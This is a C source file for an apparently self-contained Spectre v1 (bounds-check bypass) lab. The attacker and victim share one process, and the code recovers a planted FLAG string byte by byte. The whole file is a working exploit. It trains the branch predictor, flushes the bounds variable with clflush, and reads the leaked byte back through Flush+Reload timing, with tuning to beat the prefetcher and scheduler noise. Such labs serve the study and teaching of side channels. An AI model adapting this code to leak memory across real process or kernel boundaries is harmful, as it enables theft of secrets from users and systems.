#include "cache_probe.h"
#include <stdlib.h>
#include <string.h>

/*
 * Isolated userspace Spectre v1 (Bounds-Check Bypass / CVE-2017-5753) lab.
 * Demonstrates pure hardware speculative execution + Flush+Reload cache timing:
 *
 * 1. `array1_size` is isolated on its own 4KB page so `clflush(&arena.array1_size)`
 *    evicts only the bounds variable to DRAM (~380+ cycles).
 * 2. `array1` and `secret` reside on a separate page kept hot in L1d (~4 cycles)
 *    so the out-of-bounds load `arena.array1[malicious_x]` resolves inside the
 *    Reorder Buffer (ROB) transient window before the branch retires.
 * 3. The dependent load `arena.array2[secret_byte * 4096]` pulls the secret-indexed
 *    page into L1/L2/LLC cache, which is then recovered via serialized `rdtscp`
 *    Flush+Reload timing.
 */

typedef struct {
    uint8_t      pad0[PAGE_STRIDE];
    unsigned int array1_size;
    uint8_t      pad1[PAGE_STRIDE];
    uint8_t      array1[16];
    uint8_t      pad2[64];
    char         secret[64];
    uint8_t      pad3[PAGE_STRIDE];
    uint8_t      array2[PROBE_ALPHABET * PAGE_STRIDE];
    uint8_t      pad4[PAGE_STRIDE];
} SpectreArena;

static SpectreArena arena __attribute__((aligned(PAGE_STRIDE))) = {
    .array1_size = 16,
    .array1      = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
    .secret      = "FLAG{SPECULATIVE_ASLR_LEAK_0x7FFF}"
};

static volatile uint8_t temp_sink = 0;

__attribute__((noinline))
static void victim_function(size_t x) {
    if (x < arena.array1_size) {
        temp_sink &= arena.array2[arena.array1[x] * PAGE_STRIDE];
    }
}

const char *spectre_v1_get_target_secret(size_t *out_len) {
    if (out_len) {
        *out_len = strlen(arena.secret);
    }
    return arena.secret;
}

uintptr_t spectre_v1_get_array1_base(void) {
    return (uintptr_t)arena.array1;
}

uintptr_t spectre_v1_get_secret_base(void) {
    return (uintptr_t)arena.secret;
}

int spectre_v1_recover_byte(
    size_t target_offset,
    uint32_t trials,
    uint64_t threshold_cycles,
    SpectreByteResult *out_result
) {
    if (!out_result || trials < 5) {
        return -1;
    }

    /* Ensure all 256 pages of array2 are backed by physical RAM (no CoW zero page) */
    static int initialized = 0;
    if (!initialized) {
        memset(arena.array2, 1, sizeof(arena.array2));
        initialized = 1;
    }

    uint32_t hits[PROBE_ALPHABET];
    uint64_t cycle_sums[PROBE_ALPHABET];
    memset(hits, 0, sizeof(hits));
    memset(cycle_sums, 0, sizeof(cycle_sums));

    size_t secret_offset = (size_t)((const uint8_t *)arena.secret - arena.array1);
    size_t malicious_x   = secret_offset + target_offset;

    /*
     * Run up to 3 adaptive passes if OS scheduler interrupts suppress speculative
     * cache hits during a pass.
     */
    uint32_t total_executed = 0;
    for (int pass = 0; pass < 3; pass++) {
        for (uint32_t t = 0; t < trials; t++) {
            total_executed++;

            /* 1. Evict all 256 pages of array2 from the cache hierarchy */
            for (int i = 0; i < PROBE_ALPHABET; i++) {
                clflush_line(&arena.array2[i * PAGE_STRIDE]);
            }

            /* 2. Train branch predictor (5 in-bounds runs per 1 out-of-bounds attack run) */
            size_t training_x = t % arena.array1_size;
            for (int j = 29; j >= 0; j--) {
                clflush_line(&arena.array1_size);
                for (volatile int z = 0; z < 100; z++) {} /* pipeline delay */

                /* Branchless bit-hack to select training_x or malicious_x without a branch */
                size_t x = ((j % 6) - 1) & ~0xFFFFULL;
                x = (x | (x >> 16));
                x = training_x ^ (x & (malicious_x ^ training_x));

                /* Keep target secret cache line hot in L1d so transient load resolves before ROB retirement */
                (void)*(volatile const char *)&arena.secret[target_offset];

                victim_function(x);
            }

            /* 3. Reload phase: probe in prime stride (167) to defeat hardware stride prefetcher */
            for (int i = 0; i < PROBE_ALPHABET; i++) {
                int mix_i = ((i * 167) + 13) & 255;
                if (mix_i >= 1 && mix_i <= 16) {
                    continue; /* skip in-bounds training values 1..16 */
                }
                const void *probe_addr = &arena.array2[mix_i * PAGE_STRIDE];
                uint64_t elapsed = rdtscp_time_load(probe_addr);
                if (elapsed <= threshold_cycles) {
                    hits[mix_i]++;
                    cycle_sums[mix_i] += elapsed;
                }
            }
        }

        /* Check if we have a clear speculative winner */
        uint32_t max_h = 0, sec_h = 0;
        for (int i = 17; i < PROBE_ALPHABET; i++) {
            if (hits[i] > max_h) {
                sec_h = max_h;
                max_h = hits[i];
            } else if (hits[i] > sec_h) {
                sec_h = hits[i];
            }
        }
        if (max_h >= 2 && max_h > sec_h + 1) {
            break;
        }
    }

    /* Locate highest and second-highest scoring byte candidates outside training values 1..16 */
    int best = 0, second = 17;
    for (int i = 17; i < PROBE_ALPHABET; i++) {
        if (hits[i] > hits[best] || (hits[i] == hits[best] && hits[i] > 0 && cycle_sums[i] < cycle_sums[best])) {
            second = best;
            best = i;
        } else if (i != best && (hits[i] > hits[second] || (hits[i] == hits[second] && hits[i] > 0 && cycle_sums[i] < cycle_sums[second]))) {
            second = i;
        }
    }

    out_result->recovered_byte  = (uint8_t)best;
    out_result->runner_up_byte  = (uint8_t)second;
    out_result->best_hits       = hits[best];
    out_result->runner_up_hits  = hits[second];
    out_result->total_trials    = total_executed;
    out_result->best_avg_cycles = (hits[best] > 0) ? (cycle_sums[best] / hits[best]) : threshold_cycles;
    out_result->confidence      = (hits[best] + hits[second] > 0)
        ? ((double)hits[best] / (double)(hits[best] + hits[second]))
        : 0.0;
    return 0;
}

int spectre_v1_recover_secret(
    uint32_t trials_per_byte,
    uint64_t threshold_cycles,
    char *out_buf,
    size_t buf_len,
    SpectreByteResult *byte_results_out
) {
    size_t secret_len = 0;
    spectre_v1_get_target_secret(&secret_len);
    size_t count = (buf_len - 1 < secret_len) ? (buf_len - 1) : secret_len;

    for (size_t i = 0; i < count; i++) {
        SpectreByteResult res;
        if (spectre_v1_recover_byte(i, trials_per_byte, threshold_cycles, &res) != 0) {
            return -1;
        }
        out_buf[i] = (char)res.recovered_byte;
        if (byte_results_out) {
            byte_results_out[i] = res;
        }
    }
    out_buf[count] = '\0';
    return (int)count;
}
